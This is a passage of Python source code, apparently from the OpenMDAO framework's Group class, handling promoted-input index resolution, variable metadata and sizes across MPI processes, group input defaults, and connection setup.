subname in self._promotes_src_indices:\n            if subprom in self._promotes_src_indices[subname]:\n                return subname, subprom, self._promotes_src_indices[subname][subprom]\n        return subname, subprom, None\n\n    def _resolve_src_indices(self):\n        # called at top level only\n        # create a dict mapping abs inputs to top level _PromotesInfo\n        all_abs2meta_out = self._var_allprocs_abs2meta['output']\n        abs2meta_in = self._var_abs2meta['input']\n        tdict = {}\n        for tgt, src in self._conn_global_abs_in2out.items():\n            # skip remote vars, discretes and non-distributed auto_ivcs\n            if tgt not in abs2meta_in or src not in all_abs2meta_out:\n                continue\n            if src.startswith('_auto_ivc.') and not all_abs2meta_out[src]['distributed']:\n                continue\n\n            src_inds = flat_src_inds = None\n            src_shape = parent_src_shape = all_abs2meta_out[src]['global_shape']\n\n            # use src_indices coming from 'connect' call as our starting ones\n            if not abs2meta_in[tgt].get('add_input_src_indices'):\n                src_inds = abs2meta_in[tgt]['src_indices']\n                flat_src_inds = abs2meta_in[tgt]['flat_src_indices']\n\n            tdict[tgt] = (_PromotesInfo(src_inds, flat_src_inds, shape2tuple(src_shape)),\n                          shape2tuple(parent_src_shape), src, self.pathname)\n\n        with multi_proc_exception_check(self.comm):\n            self._resolve_src_inds(tdict, self)\n\n    def _resolve_src_inds(self, my_tdict, top):\n        abs2meta_out = self._var_allprocs_abs2meta['output']\n        abs2meta_in = self._var_abs2meta['input']\n        abs2prom = self._var_allprocs_abs2prom['input']\n\n        tdict = {}  # maps subname to map of abs input to _PromotesInfo\n        for tgt, (oldinfo, parent_src_shape, oldprom, oldpath) in my_tdict.items():\n            src_inds, flat_src_inds, _ = oldinfo\n            prom = abs2prom[tgt]\n\n            subname, subprom, tup = self._get_promotes_call_info(tgt)\n            if tup is not None:\n                pinfo, _ = tup\n                if parent_src_shape is not None and pinfo.src_shape is not None:\n                    if parent_src_shape != pinfo.src_shape:\n                        if oldinfo.src_indices is not None:\n                            parent_src_shape = shape_from_idx(parent_src_shape, oldinfo.src_indices,\n                                                              oldinfo.flat)\n                            oldprom = prom\n                            oldpath = self.pathname\n                        if parent_src_shape != pinfo.src_shape:\n                            msg = (f\"{self.msginfo}: Promoted src_shape of {pinfo.src_shape} for \"\n                                   f\"'{subprom}' in \"\n                                   f\"'{'.'.join((self.pathname, subname)).lstrip('.')}' \"\n                                   f\"differs from src_shape {parent_src_shape} for '{oldprom}' in \"\n                                   f\"'{oldpath}'.\")\n                            raise RuntimeError(msg)\n\n                if parent_src_shape is None:\n                    parent_src_shape = pinfo.src_shape\n                    oldprom = prom\n                    oldpath = self.pathname\n\n                if oldinfo.src_indices is not None and pinfo.src_indices is not None:\n                    try:\n                        pinfo = pinfo.convert_from(oldinfo)\n                    except Exception as err:\n                        conns = self._problem_meta['model_ref']()._conn_global_abs_in2out\n                        parinput = prom if oldinfo.parent is None else oldinfo.prom_path()\n                        if tgt in conns:\n                            src = conns[tgt]\n                            owner, sprom, tprom = get_connection_owner(self, tgt)\n                            if owner is not None:\n                                msg = (f\"In connection from '{sprom}' to '{tprom}' in group \"\n                                       f\"'{owner}', \")\n                            else:\n                                msg = f\"In connection from '{src}' to '{tgt}', \"\n\n                            raise RuntimeError(f\"{msg}input '{parinput}' src_indices are \"\n                                               f\"{oldinfo.src_indices} and indexing into those \"\n                                               f\"failed using src_indices {pinfo.src_indices} from \"\n                                               f\"input '{pinfo.prom_path()}'. Error was: {err}.\")\n                        else:\n                            raise RuntimeError(f\"Input '{parinput}' src_indices are \"\n                                               f\"{oldinfo.src_indices} and indexing into those \"\n                                               f\"failed using src_indices {pinfo.src_indices} from \"\n                                               f\"input '{pinfo.prom_path()}'. Error was: {err}.\")\n            else:\n                pinfo = oldinfo.copy()\n\n            gsrc_shape = self._get_group_input_meta(prom, 'src_shape')\n            if gsrc_shape is not None:\n                parent_src_shape = gsrc_shape\n                oldprom = prom\n                oldpath = self.pathname\n\n            if subname in tdict:\n                tdict[subname][tgt] = (pinfo, parent_src_shape, oldprom, oldpath)\n            else:\n                tdict[subname] = {tgt: (pinfo, parent_src_shape, oldprom, oldpath)}\n\n            shape = None\n            if pinfo.src_shape is not None:\n                shape = pinfo.src_shape\n            if shape is None:\n                if parent_src_shape is not None:\n                    shape = parent_src_shape\n\n            # as soon as we get a src_shape, set that at the top so we can use it to\n            # set auto_ivc shape\n            if shape is not None:\n                top_prom = top._var_allprocs_abs2prom['input'][tgt]\n                if top_prom not in top._var_prom2inds:\n                    top._var_prom2inds[top_prom] = [None, None, None]\n                if top._var_prom2inds[top_prom][0] is None:\n                    top._var_prom2inds[top_prom][0] = shape\n\n            # store shape, indices info under the prom name\n            if self.pathname == '':\n                self._var_prom2inds[prom] = [shape, pinfo.src_indices, pinfo.flat]\n            else:\n                self._var_prom2inds[prom] = [parent_src_shape, oldinfo.src_indices, oldinfo.flat]\n\n        for s in self._subsystems_myproc:\n            if s.name in tdict:\n                s._resolve_src_inds(tdict[s.name], top)\n                del tdict[s.name]\n\n    def _setup_var_data(self):\n        \"\"\"\n        Compute the list of abs var names, abs/prom name maps, and metadata dictionaries.\n        \"\"\"\n        if self._var_allprocs_prom2abs_list is None:\n            old_prom2abs = {}\n        else:\n            old_prom2abs = self._var_allprocs_prom2abs_list['input']\n\n        super()._setup_var_data()\n\n        var_discrete = self._var_discrete\n        allprocs_discrete = self._var_allprocs_discrete\n\n        abs2meta = self._var_abs2meta\n        abs2prom = self._var_abs2prom\n\n        allprocs_abs2meta = {'input': {}, 'output': {}}\n\n        allprocs_prom2abs_list = self._var_allprocs_prom2abs_list\n\n        for n, lst in self._group_inputs.items():\n            lst[0]['path'] = self.pathname  # used for error reporting\n            self._group_inputs[n] = lst.copy()  # must copy the list manually\n\n        self._has_distrib_vars = False\n        self._promotes_src_indices = {}\n\n        for subsys in self._subsystems_myproc:\n            self._has_output_scaling |= subsys._has_output_scaling\n            self._has_output_adder |= subsys._has_output_adder\n            self._has_resid_scaling |= subsys._has_resid_scaling\n            self._has_distrib_vars |= subsys._has_distrib_vars\n\n            var_maps = subsys._get_promotion_maps()\n            promotes_src_indices = {}\n\n            sub_prefix = subsys.name + '.'\n\n            for io in ['input', 'output']:\n                abs2meta[io].update(subsys._var_abs2meta[io])\n                allprocs_abs2meta[io].update(subsys._var_allprocs_abs2meta[io])\n                subprom2prom = var_maps[io]\n\n                allprocs_discrete[io].update(subsys._var_allprocs_discrete[io])\n                var_discrete[io].update({sub_prefix + k: v for k, v in\n                                         subsys._var_discrete[io].items()})\n\n                sub_loc_proms = subsys._var_abs2prom[io]\n                for sub_prom, sub_abs in subsys._var_allprocs_prom2abs_list[io].items():\n                    if sub_prom in subprom2prom:\n                        prom_name, _, pinfo, _ = subprom2prom[sub_prom]\n                        if io == 'input' and pinfo is not None:\n                            pinfo = pinfo.copy()\n                            pinfo.parent = subsys.pathname\n                            pinfo.prom = sub_prom\n                            promotes_src_indices[sub_prom] = (pinfo, sub_abs)\n                    else:\n                        prom_name = sub_prefix + sub_prom\n                    if prom_name not in allprocs_prom2abs_list[io]:\n                        allprocs_prom2abs_list[io][prom_name] = []\n                    allprocs_prom2abs_list[io][prom_name].extend(sub_abs)\n                    for abs_name in sub_abs:\n                        if abs_name in sub_loc_proms:\n                            abs2prom[io][abs_name] = prom_name\n\n            if isinstance(subsys, Group):\n                subprom2prom = var_maps['input']\n                for sub_prom, metalist in subsys._group_inputs.items():\n                    if sub_prom in subprom2prom:\n                        key = subprom2prom[sub_prom][0]\n                    else:\n                        key = sub_prefix + sub_prom\n                    if key not in self._group_inputs:\n                        self._group_inputs[key] = [{'path': self.pathname, 'prom': key,\n                                                    'auto': True}]\n                    self._group_inputs[key].extend(metalist)\n\n            if promotes_src_indices:\n                self._promotes_src_indices[subsys.name] = promotes_src_indices\n\n        # If running in parallel, allgather\n        if self.comm.size > 1 and self._mpi_proc_allocator.parallel:\n            mysub = self._subsystems_myproc[0] if self._subsystems_myproc else False\n            if (mysub and mysub.comm.rank == 0 and (mysub._full_comm is None or\n                                                    mysub._full_comm.rank == 0)):\n                raw = (allprocs_discrete, allprocs_prom2abs_list, allprocs_abs2meta,\n                       self._has_output_scaling, self._has_output_adder,\n                       self._has_resid_scaling, self._group_inputs, self._has_distrib_vars)\n            else:\n                raw = (\n                    {'input': {}, 'output': {}},\n                    {'input': {}, 'output': {}},\n                    {'input': {}, 'output': {}},\n                    False,\n                    False,\n                    False,\n                    {},\n                    False,\n                )\n\n            gathered = self.comm.allgather(raw)\n\n            # start with a fresh OrderedDict to keep order the same in all procs\n            old_abs2meta = allprocs_abs2meta\n            allprocs_abs2meta = {'input': OrderedDict(), 'output': OrderedDict()}\n\n            for io in ['input', 'output']:\n                allprocs_prom2abs_list[io] = OrderedDict()\n\n            myrank = self.comm.rank\n            for rank, (proc_discrete, proc_prom2abs_list, proc_abs2meta,\n                       oscale, oadd, rscale, ginputs, has_dist_vars) in enumerate(gathered):\n                self._has_output_scaling |= oscale\n                self._has_output_adder |= oadd\n                self._has_resid_scaling |= rscale\n                self._has_distrib_vars |= has_dist_vars\n\n                if rank != myrank:\n                    for p, mlist in ginputs.items():\n                        if p not in self._group_inputs:\n                            self._group_inputs[p] = []\n                        self._group_inputs[p].extend(mlist)\n\n                for io in ['input', 'output']:\n                    allprocs_abs2meta[io].update(proc_abs2meta[io])\n                    allprocs_discrete[io].update(proc_discrete[io])\n\n                    for prom_name, abs_names_list in proc_prom2abs_list[io].items():\n                        if prom_name not in allprocs_prom2abs_list[io]:\n                            allprocs_prom2abs_list[io][prom_name] = []\n                        allprocs_prom2abs_list[io][prom_name].extend(abs_names_list)\n\n            for io in ('input', 'output'):\n                if allprocs_abs2meta[io]:\n                    # update new allprocs_abs2meta with our local version (now that we have a\n                    # consistent order for our OrderedDict), so that the 'size' metadata will\n                    # accurately reflect this proc's var size instead of one from some other proc.\n                    allprocs_abs2meta[io].update(old_abs2meta[io])\n\n        self._var_allprocs_abs2meta = allprocs_abs2meta\n\n        for prom_name, abs_list in allprocs_prom2abs_list['output'].items():\n            if len(abs_list) > 1:\n                raise RuntimeError(\"{}: Output name '{}' refers to \"\n                                   \"multiple outputs: {}.\".format(self.msginfo, prom_name,\n                                                                  sorted(abs_list)))\n\n        for io in ('input', 'output'):\n            a2p = self._var_allprocs_abs2prom[io]\n            for prom, abslist in self._var_allprocs_prom2abs_list[io].items():\n                for abs_name in abslist:\n                    a2p[abs_name] = prom\n\n        if self._group_inputs:\n            p2abs_in = self._var_allprocs_prom2abs_list['input']\n            extra = [gin for gin in self._group_inputs if gin not in p2abs_in]\n            if extra:\n                # make sure that we don't have a leftover group input default entry from a previous\n                # execution of _setup_var_data before promoted names were updated.\n                ex = set()\n                for e in extra:\n                    if e in old_prom2abs:\n                        del self._group_inputs[e]  # clean up old key using old promoted name\n                    else:\n                        ex.add(e)\n                if ex:\n                    raise RuntimeError(f\"{self.msginfo}: The following group inputs, passed to \"\n                                       f\"set_input_defaults(), could not be found: {sorted(ex)}.\")\n\n        if self._var_discrete['input'] or self._var_discrete['output']:\n            self._discrete_inputs = _DictValues(self._var_discrete['input'])\n            self._discrete_outputs = _DictValues(self._var_discrete['output'])\n        else:\n            self._discrete_inputs = self._discrete_outputs = ()\n\n        self._vars_to_gather = self._find_remote_var_owners()\n\n    def _resolve_group_input_defaults(self, show_warnings=False):\n        \"\"\"\n        Resolve any ambiguities in group input defaults throughout the model.\n\n        Parameters\n        ----------\n        show_warnings : bool\n            Bool to show or hide the auto_ivc warnings.\n        \"\"\"\n        skip = set(('path', 'use_tgt', 'prom', 'src_shape', 'src_indices', 'auto'))\n        prom2abs_in = self._var_allprocs_prom2abs_list['input']\n\n        self._auto_ivc_warnings = []\n\n        for prom, metalist in self._group_inputs.items():\n            try:\n                paths = [(i, m['path']) for i, m in enumerate(metalist) if not m['auto']]\n                top_origin = paths[0][1]\n                top_prom = metalist[paths[0][0]]['prom']\n            except KeyError:\n                issue_warning(\"No auto IVCs found\", prefix=self.msginfo, category=PromotionWarning)\n            allmeta = set()\n            for meta in metalist:\n                allmeta.update(meta)\n            fullmeta = {n: _UNDEFINED for n in allmeta - skip}\n\n            for key in sorted(fullmeta):\n                for i, submeta in enumerate(metalist):\n                    if submeta['auto']:\n                        continue\n                    if key in submeta:\n                        if fullmeta[key] is _UNDEFINED:\n                            origin = submeta['path']\n                            origin_prom = submeta['prom']\n                            val = fullmeta[key] = submeta[key]\n                            if origin != top_origin:\n                                msg = (f\"Group '{top_origin}' did not set a default \"\n                                       f\"'{key}' for input '{top_prom}', so the value of \"\n                                       f\"({val}) from group '{origin}' will be used.\")\n                                if show_warnings:\n                                    issue_warning(msg, category=PromotionWarning)\n                                else:\n                                    self._auto_ivc_warnings.append(msg)\n\n                        else:\n                            eq = submeta[key] == val\n                            if isinstance(eq, np.ndarray):\n                                eq = np.all(eq)\n                            if not eq:\n                                # first, see if origin is an ancestor\n                                if not origin or submeta['path'].startswith(origin + '.'):\n                                    msg = (f\"Groups '{origin}' and '{submeta['path']}' \"\n                                           f\"called set_input_defaults for the input \"\n                                           f\"'{origin_prom}' with conflicting '{key}'. \"\n                                           f\"The value ({val}) from '{origin}' will be \"\n                                           \"used.\")\n                                    if show_warnings:\n                                        issue_warning(msg, category=PromotionWarning)\n                                    else:\n                                        self._auto_ivc_warnings.append(msg)\n                                else:  # origin is not an ancestor, so we have an ambiguity\n                                    if origin_prom != submeta['prom']:\n                                        prm = f\"('{origin_prom}' / '{submeta['prom']}')\"\n                                    else:\n                                        prm = f\"'{origin_prom}'\"\n                                    common = common_subpath((origin, submeta['path']))\n                                    if common:\n                                        sub = self._get_subsystem(common)\n                                        if sub is not None:\n                                            for a in prom2abs_in[prom]:\n                                                if a in sub._var_abs2prom['input']:\n                                                    prom = sub._var_abs2prom['input'][a]\n                                                    break\n\n                                    gname = f\"Group named '{common}'\" if common else 'model'\n                                    conditional_error(f\"{self.msginfo}: The subsystems {origin} \"\n                                                      f\"and {submeta['path']} called \"\n                                                      f\"set_input_defaults for promoted input \"\n                                                      f\"{prm} with conflicting values for \"\n                                                      f\"'{key}'. Call <group>.set_input_defaults(\"\n                                                      f\"'{prom}', {key}=?), where <group> is the \"\n                                                      f\"{gname} to remove the ambiguity.\")\n\n            # update all metadata dicts with any missing metadata that was filled in elsewhere\n            for meta in metalist:\n                meta.update(fullmeta)\n\n    def _find_remote_var_owners(self):\n        \"\"\"\n        Return a mapping of var pathname to owning rank.\n\n        The mapping will contain ONLY systems that are remote on at least one proc.\n        Distributed systems are not included.\n\n        Returns\n        -------\n        dict\n            The mapping of variable pathname to owning rank.\n        \"\"\"\n        remote_vars = {}\n\n        if self.comm.size > 1:\n            myproc = self.comm.rank\n            nprocs = self.comm.size\n\n            for io in ('input', 'output'):\n                abs2prom = self._var_abs2prom[io]\n                abs2meta = self._var_allprocs_abs2meta[io]\n\n                # var order must be same on all procs\n                sorted_names = sorted(self._var_allprocs_abs2prom[io])\n                locality = np.zeros((nprocs, len(sorted_names)), dtype=bool)\n                for i, name in enumerate(sorted_names):\n                    if name in abs2prom:\n                        locality[myproc, i] = True\n\n                my_loc = locality[myproc, :].copy()\n                self.comm.Allgather(my_loc, locality)\n\n                for i, name in enumerate(sorted_names):\n                    nzs = np.nonzero(locality[:, i])[0]\n                    if name in abs2meta and abs2meta[name]['distributed']:\n                        pass\n                    elif 0 < nzs.size < nprocs:\n                        remote_vars[name] = nzs[0]\n\n        return remote_vars\n\n    def _setup_var_sizes(self):\n        \"\"\"\n        Compute the arrays of variable sizes for all variables/procs on this system.\n        \"\"\"\n        self._var_offsets = None\n\n        for subsys in self._subsystems_myproc:\n            subsys._setup_var_sizes()\n\n        nl_allprocs_relnames = self._var_allprocs_relevant_names['nonlinear']\n        nl_relnames = self._var_relevant_names['nonlinear']\n\n        all_abs2meta = self._var_allprocs_abs2meta\n        iproc = self.comm.rank\n        for io in ('input', 'output'):\n            nl_allprocs_relnames[io] = list(self._var_allprocs_abs2meta[io])\n            nl_relnames[io] = list(self._var_abs2meta[io])\n\n            sizes = self._var_sizes['nonlinear'][io] = np.zeros((self.comm.size,\n                                                                len(all_abs2meta[io])),\n                                                                dtype=INT_DTYPE)\n            abs2meta = self._var_abs2meta[io]\n            for i, name in enumerate(self._var_allprocs_abs2meta[io]):\n                if name in abs2meta:\n                    sizes[iproc, i] = abs2meta[name]['size']\n\n            if self.comm.size > 1:\n                my_sizes = sizes[iproc, :].copy()\n                self.comm.Allgather(my_sizes, sizes)\n\n        self._setup_var_index_maps('nonlinear')\n        self._var_allprocs_abs2meta['linear'] = self._var_allprocs_abs2idx['nonlinear']\n\n        relnames = self._var_allprocs_relevant_names\n        vec_names = self._lin_rel_vec_name_list[1:] if self._use_derivatives else []\n        abs2idx = self._var_allprocs_abs2idx['nonlinear']\n\n        sizes = self._var_sizes\n        nl_sizes = sizes['nonlinear']\n        for vec_name in vec_names:\n            sizes[vec_name] = {}\n\n            for io in ['input', 'output']:\n                sizes[vec_name][io] = sz = np.zeros((self.comm.size, len(relnames[vec_name][io])),\n                                                    INT_DTYPE)\n\n                # Compute _var_sizes based on 'nonlinear' var sizes\n                for idx, abs_name in enumerate(relnames[vec_name][io]):\n                    sz[:, idx] = nl_sizes[io][:, abs2idx[abs_name]]\n\n            self._setup_var_index_maps(vec_name)\n\n        if self.comm.size > 1:\n            if (self._has_distrib_vars or self._contains_parallel_group or\n                not np.all(self._var_sizes['nonlinear']['output']) or\n               not np.all(self._var_sizes['nonlinear']['input'])):\n\n                if self._distributed_vector_class is not None:\n                    self._vector_class = self._distributed_vector_class\n                else:\n                    raise RuntimeError(\"{}: Distributed vectors are required but no distributed \"\n                                       \"vector type has been set.\".format(self.msginfo))\n        else:\n            self._vector_class = self._local_vector_class\n\n        if self._use_derivatives:\n            self._var_sizes['linear'] = self._var_sizes['nonlinear']\n            self._var_allprocs_relevant_names['linear'] = \\\n                self._var_allprocs_relevant_names['nonlinear']\n            self._var_relevant_names['linear'] = self._var_relevant_names['nonlinear']\n            self._var_allprocs_abs2idx['linear'] = self._var_allprocs_abs2idx['nonlinear']\n\n        self._compute_owning_ranks()\n\n    def _compute_owning_ranks(self):\n        abs2meta = self._var_allprocs_abs2meta\n        abs2discrete = self._var_allprocs_discrete\n\n        if self.comm.size > 1:\n            owns = self._owning_rank\n            self._owned_sizes = self._var_sizes['nonlinear']['output'].copy()\n            abs2idx = self._var_allprocs_abs2idx['nonlinear']\n            for io in ('input', 'output'):\n                sizes = self._var_sizes['nonlinear'][io]\n                for name, meta in abs2meta[io].items():\n                    i = abs2idx[name]\n                    for rank in range(self.comm.size):\n                        if sizes[rank, i] > 0:\n                            owns[name] = rank\n                            if io == 'output' and not meta['distributed']:\n                                self._owned_sizes[rank + 1:, i] = 0  # zero out all dups\n                            break\n\n                if abs2discrete[io]:\n                    prefix = self.pathname + '.' if self.pathname else ''\n                    all_set = set(abs2discrete[io])\n                    local = set([prefix + n for n in self._var_discrete[io]])\n                    remote = set()\n                    for rank, names in enumerate(self.comm.allgather(local)):\n                        for n in names:\n                            if n not in owns:\n                                owns[n] = rank\n                        remote.update(all_set - names)\n        else:\n            self._owned_sizes = self._var_sizes['nonlinear']['output']\n\n    def _setup_global_connections(self, conns=None):\n        \"\"\"\n        Compute dict of all connections between this system's inputs and outputs.\n\n        The connections come from 4 sources:\n        1. Implicit connections owned by the current system\n        2. Explicit connections declared by the current system\n        3. Explicit connections declared by parent systems\n        4. Implicit / explicit from subsystems\n\n        Parameters\n        ----------\n        conns : dict\n            Dictionary of connections passed down from parent group.\n        \"\"\"\n        if not self._raise_connection_errors:\n            self._set_subsys_connection_errors(False)\n\n        global_abs_in2out = self._conn_global_abs_in2out = {}\n\n        allprocs_prom2abs_list_in = self._var_allprocs_prom2abs_list['input']\n        allprocs_prom2abs_list_out = self._var_allprocs_prom2abs_list['output']\n\n        allprocs_discrete_in = self._var_allprocs_discrete['input']\n        allprocs_discrete_out = self._var_allprocs_discrete['output']\n\n        pathname = self.pathname\n\n        abs_in2out = {}\n\n        if pathname == '':\n            path_len = 0\n            nparts = 0\n        else:\n            path_len = len(pathname) + 1\n            nparts = len(pathname.split('.'))\n\n        new_conns = {}\n\n        if conns is not None:\n            for abs_in, abs_out in conns.items():\n                inparts = abs_in.split('.')\n                outparts = abs_out.split('.')\n\n                if inparts[:nparts] == outparts[:nparts]:\n                    global_abs_in2out[abs_in] = abs_out\n\n                    # if connection is contained in a subgroup, add to conns\n                    # to pass down to subsystems.\n                    if inparts[nparts] == outparts[nparts]:\n                        if inparts[nparts] not in new_conns:\n                            new_conns[inparts[nparts]] = {}\n                        new_conns[inparts[nparts]][abs_in] = abs_out\n\n        # Add implicit connections (only ones owned by this group)\n        for prom_name in allprocs_prom2abs_list_out:\n            if prom_name in allprocs_prom2abs_list_in:\n                abs_out = allprocs_prom2abs_list_out[prom_name][0]\n                out_subsys = abs_out[path_len:].split('.', 1)[0]\n                for abs_in in allprocs_prom2abs_list_in[prom_name]:\n                    in_subsys = abs_in[path_len:].split('.', 1)[0]\n                    if out_subsys != in_subsys:\n                        abs_in2out[abs_in] = abs_out\n\n        src_ind_inputs = set()\n        abs2meta = self._var_abs2meta['input']\n        allprocs_abs2meta_in = self._var_allprocs_abs2meta['input']\n\n        # Add explicit connections (only ones declared by this group)\n        for prom_in, (prom_out, src_indices, flat) in self._manual_connections.items():\n\n            # throw an exception if either output or input doesn't exist\n            # (not traceable to a connect statement, so provide context)\n            if not (prom_out in allprocs_prom2abs_list_out or prom_out in allprocs_discrete_out):\n                if (prom_out in allprocs_prom2abs_list_in or prom_out in allprocs_discrete_in):\n                    msg = f\"{self.msginfo}: Attempted to connect from '{prom_out}' to \" + \\\n                          f\"'{prom_in}', but '{prom_out}' is an input. \" + \\\n                          \"All connections must be from an output to an input.\"\n                    if self._raise_connection_errors:\n                        raise NameError(msg)\n                    else:\n                        issue_warning(msg, category=SetupWarning)\n                        continue\n                else:\n                    msg = f\"{self.msginfo}: Attempted to connect from '{prom_out}' to \" + \\\n                          f\"'{prom_in}', but '{prom_out}' doesn't exist.\"\n                    if self._raise_connection_errors:\n                        raise NameError(msg)\n                    else:\n                        issue_warning(msg, category=SetupWarning)\n                        continue\n\n            if not (prom_in in allprocs_prom2abs_list_in or prom_in in allprocs_discrete_in):\n                if (prom_in in allprocs_prom2abs_list_out or prom_in in allprocs_discrete_out):\n                    msg = f\"{self.msginfo}: Attempted to connect from '{prom_out}' to \" + \\\n                          f\"'{prom_in}', but '{prom_in}' is an output. \" + \\\n                          \"All connections must be from an output to an input.\"\n                    if self._raise_connection_errors:\n                        raise NameError(msg)\n                    else:\n                        issue_warning(msg, category=SetupWarning)\n                        continue\n                else:\n                    msg = f\"{self.msginfo}: Attempted to connect from '{prom_out}' to \" + \\\n                          f\"'{prom_in}', but '{prom_in}' doesn't exist.\"\n                    if self._raise_connection_errors:\n                        raise NameError(msg)\n                    else:\n                        issue_warning(msg, category=SetupWarning)\n                        continue\n\n            # Throw an exception if output and input are in the same system\n            # (not traceable to a connect statement, so provide context)\n            # and check if src_indices is defined in both connect and add_input.\n            abs_out = allprocs_prom2abs_list_out[prom_out][0]\n            outparts = abs_out.split('.')\n            out_subsys = outparts[:-1]\n\n            for abs_in in allprocs_prom2abs_list_in[prom_in]:\n                inparts = abs_in.split('.')\n                in_subsys = inparts[:-1]\n                if out_subsys == in_subsys:\n                    msg = f\"{self.msginfo}: Output and input are in the same System for \" + \\\n                          f\"connection from '{prom_out}' to '{prom_in}'.\"\n                    if self._raise_connection_errors:\n                        raise RuntimeError(msg)\n                    else:\n                        issue_warning(msg, category=SetupWarning)\n                        continue\n\n                if src_indices is not None:\n                    a2m = allprocs_abs2meta_in[abs_in]\n                    if (a2m['shape_by_conn'] or a2m['copy_shape']):\n                        raise ValueError(f\"{self.msginfo}: Setting of 'src_indices' along with \"\n                                         f\"'shape_by_conn' or 'copy_shape' for variable '{abs_in}' \"\n                                         \"is currently unsupported.\")\n\n                    if abs_in in abs2meta:\n                        meta = abs2meta[abs_in]\n                        if meta['src_indices'] is not None:\n                            msg = f\"{self.msginfo}: src_indices has been defined in both \" + \\\n                                  f\"connect('{prom_out}', '{prom_in}') and \" + \\\n                                  f\"add_input('{prom_in}', ...).\"\n                            if self._raise_connection_errors:\n                                raise RuntimeError(msg)\n                            else:\n                                issue_warning(msg, category=SetupWarning)\n                                continue\n                        meta['src_indices'] = src_indices\n                        if _is_slicer_op(src_indices):\n                            meta['src_slice'] = src_indices\n                        else:\n                            meta['flat_src_indices'] = flat\n\n                    src_ind_inputs.add(abs_in)\n\n                if abs_in in abs_in2out:\n                    msg = f\"{self.msginfo}: Input '{abs_in}' cannot be connected to \" + \\\n                          f\"'{abs_out}' because it's already connected to '{abs_in2out[abs_in]}'\"\n                    if self._raise_connection_errors:\n                        raise RuntimeError(msg)\n                    else:\n                        issue_warning(msg, category=SetupWarning)\n                        continue\n\n                abs_in2out[abs_in] = abs_out\n\n                # if connection is contained in a subgroup, add to conns to pass down to subsystems.\n                if inparts[:nparts + 1] == outparts[:nparts + 1]:\n                    if inparts[nparts] not in new_conns:\n                        new_conns[inparts[nparts]] = {}\n                    new_conns[inparts[nparts]][abs_in] = abs_out\n\n        # Compute global_abs_in2out by first adding this group's contributions,\n        # then adding contributions from systems above/below, then allgathering.\n        conn_list = list(global_abs_in2out.items())\n        conn_list.extend(abs_in2out.items())\n        global_abs_in2out.update(abs_in2out)\n\n        for subsys in self._subsystems_myproc:\n            if isinstance(subsys, Group):\n                if subsys.name in new_conns:\n                    subsys._setup_global_connections(conns=new_conns[subsys.name])\n                else:\n                    subsys._setup_global_connections()\n                global_abs_in2out.update(subsys._conn_global_abs_in2out)\n                conn_list.extend(subsys._conn_global_abs_in2out.items())\n\n        if len(conn_list) > len(global_abs_in2out):\n            dupes = [n for n, val in Counter(tgt for tgt, src in conn_list).items() if val > 1]\n            dup_info = defaultdict(set)\n            for tgt, src in conn_list:\n                for dup in dupes:\n                    if tgt == dup:\n                        dup_info[tgt].add(src)\n            dup_info = [(n, srcs) for n, srcs in dup_info.items() if len(srcs) > 1]\n            if dup_info:\n                dup = [\"%s from %s\" % (tgt, sorted(srcs)) for tgt, srcs in dup_info]\n                msg = f\"{self.msginfo}: The following inputs have multiple connections: \" + \\\n                      f\"{', '.join(dup)}\"\n                if self._raise_connection_errors:\n                    raise RuntimeError(msg)\n                else:\n                    issue_warning(msg, category=SetupWarning)\n\n        if self.comm.size > 1 and self._mpi_proc_allocator.parallel:\n            # If running in parallel, allgather\n            if self._subsystems_myproc and self._subsystems_myproc[0].comm.rank == 0:\n                raw = (global_abs_in2out, src_ind_inputs)\n            else:\n                raw = ({}, ())\n            gathered = self.comm.allgather(raw)\n\n            all_src_ind_ins = set()\n            for myproc_global_abs_in2out, src_ind_ins in gathered:\n                global_abs_in2out.update(myproc_global_abs_in2out)\n                all_src_ind_ins.update(src_ind_ins)\n            src_ind_inputs = all_src_ind_ins\n\n        for inp in src_ind_inputs:\n            allprocs_abs2meta_in[inp]['has_src_indices'] = True\n\n    def _setup_dynamic_shapes(self):\n        \"\"\"\n        Add shape/size metadata for variables that were created with shape_by_conn or copy_shape.\n        \"\"\"\n        self._shapes_graph = graph = nx.OrderedGraph()  # ordered graph for consistency across procs\n        self._shape_knowns = knowns = set()\n        all_abs2meta_out = self._var_allprocs_abs2meta['output']\n        all_abs2meta_in = self._var_allprocs_abs2meta['input']\n\n        def copy_var_meta(from_var, to_var, distrib_sizes):\n            # copy size/shape info from from_var's metadata to to_var's metadata\n\n            from_io = 'output' if from_var in all_abs2meta_out else 'input'\n            to_io = 'output' if to_var in all_abs2meta_out else 'input'\n\n            # transfer shape/size info from from_var to to_var\n            all_from_meta = self._var_allprocs_abs2meta[from_io][from_var]\n            all_to_meta = self._var_allprocs_abs2meta[to_io][to_var]\n            from_meta = self._var_abs2meta[from_io].get(from_var, {})\n            to_meta = self._var_abs2meta[to_io].get(to_var, {})\n\n            nprocs = self.comm.size\n\n            from_dist = nprocs > 1 and all_from_meta['distributed']\n            from_size = all_from_meta['size']\n            from_shape = all_from_meta['shape']\n\n            to_dist = nprocs > 1 and all_to_meta['distributed']\n\n            # known dist output to/from serial input.  We don't allow this case because serial\n            # variables must have the same value on all procs and the only way this is possible is\n            # if the src_indices on each proc are identical, but that's not possible if we assume\n            # 'always local' transfer (see POEM 46).\n            if from_dist and not to_dist:\n                if from_io == 'output':\n                    raise RuntimeError(f\"{self.msginfo}: dynamic sizing of serial {to_io} \"\n                                       f\"'{to_var}' from distributed {from_io} '{from_var}' is not \"\n                                       \"supported.\")\n                else:  # serial_out <- dist_in\n                    # all input rank sizes must be the same\n                    if not np.all(distrib_sizes[from_var] == distrib_sizes[from_var][0]):\n                        raise RuntimeError(f\"{self.msginfo}: dynamic sizing of serial {to_io} \"\n                                           f\"'{to_var}' from distributed {from_io} '{from_var}' is \"\n                                           f\"not supported because not all {from_var} ranks are \"\n                                           f\"the same size (sizes={distrib_sizes[from_var]}).\")\n\n            all_to_meta['shape'] = from_shape\n            all_to_meta['size'] = from_size\n            if to_meta:\n                to_meta['shape'] = from_shape\n                to_meta['size'] = from_size\n                to_meta['value'] = np.full(from_shape, to_meta['value'])\n            if from_var in distrib_sizes:\n                distrib_sizes[to_var] = distrib_sizes[from_var]\n\n        all_abs2prom_in = self._var_allprocs_abs2prom['input']\n        all_abs2prom_out = self._var_allprocs_abs2prom['output']\n        nprocs = self.comm.size\n        conn = self._conn_global_abs_in2out\n        rev_conn = None\n\n        def get_rev_conn():\n            # build reverse connection dict (src: tgts)\n            rev = {}\n            for tgt, src in conn.items():\n                if src in rev:\n                    rev[src].append(tgt)\n                else:\n                    rev[src] = [tgt]\n            return rev\n\n        graph = 